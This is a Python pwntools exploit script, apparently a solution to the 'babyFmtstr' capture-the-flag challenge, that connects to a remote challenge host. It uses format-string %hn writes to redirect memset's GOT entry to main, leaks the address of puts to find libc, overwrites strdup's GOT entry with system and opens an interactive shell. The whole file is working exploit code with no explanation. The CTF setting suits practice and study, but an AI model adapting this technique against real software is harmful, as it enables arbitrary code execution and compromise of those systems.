from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
context.arch = 'amd64'
import sys
# context.log_level = 'debug'
if len(sys.argv) == 1 or sys.argv[1] == 'l':
    p = process('./babyFmtstr')
    elf = ELF('./babyFmtstr')
else:
    p = remote('pwn.challenge.ctf.show', 28112)
    elf = ELF('./babyFmtstr')
    pause()
main_addr=0x0000000000400E93
memset_got=elf.got['memset']
strdup_got=elf.got['strdup']
puts_got=elf.got['puts']
print(hex(memset_got))
pause()
# 第八个开始
payload_1 = b"%14c%11$hhn%133c%12$hhnA" + p64(memset_got+1)+p64(memset_got) 
p.sendlineafter(b"please input name:\n",payload_1)
print(p.recv())

pause()
payload_2=b'aaaa%9$s'+p64(puts_got)
p.sendlineafter(b"please input name:\n",payload_2)
p.recvuntil(b'aaaa')
pause()
puts_addr=u64(p.recv(6).ljust(8,b'\x00'))
print(hex(puts_addr))#0x7f0a54276140
libc=LibcSearcher('puts',puts_addr)
libcbase=puts_addr-libc.dump('puts')
print(hex(libcbase))
system_addr=libcbase+libc.dump('system')
print(hex(system_addr))
x = system_addr >>16 & 0xffff
y = system_addr & 0xffff
if x>y:
    payload_3=flat(b'%',str(y).encode(),b'c%12$hn%',str(x-y).encode(),b'c%13$hn').ljust(32,b'a')
    payload_3+=flat(strdup_got,strdup_got+2)
else:
    payload_3=flat(b'%',str(x).encode(),b'c%12$hn%',str(y-x).encode(),b'c%13$hn').ljust(32,b'a')
    payload_3+=flat(strdup_got+2,strdup_got)
print(payload_3,len(payload_3))
p.sendlineafter(b"please input name:\n",payload_3)
print(hex(system_addr))
pause()
p.interactive()
